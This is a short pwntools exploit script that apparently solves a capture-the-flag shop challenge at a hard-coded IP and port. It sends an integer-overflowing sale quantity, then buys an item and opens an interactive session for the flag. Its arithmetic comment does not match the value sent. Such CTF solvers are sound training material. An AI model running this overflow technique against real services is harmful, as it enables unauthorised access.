from pwn import *

# Configuration
HOST = '16.16.199.115'  # Change this to your server
PORT = 9003                # Change this to your port

# Connect to remote server (comment out for local testing)
p = remote(HOST, PORT)

# Receive welcome and menu
p.recvuntil(b'Choice: ')

# Choose option 4 (sell knifes)
p.sendline(b'4')
p.recvuntil(b'sell? ')

# Send the overflow value
# (INT_MAX - 1000000) / 3 = 715,827,549
p.sendline(b'715827549')

# Wait for menu again
p.recvuntil(b'Choice: ')

# Choose option 3 (buy Gun)
p.sendline(b'3')

# Get the flag
p.interactive()
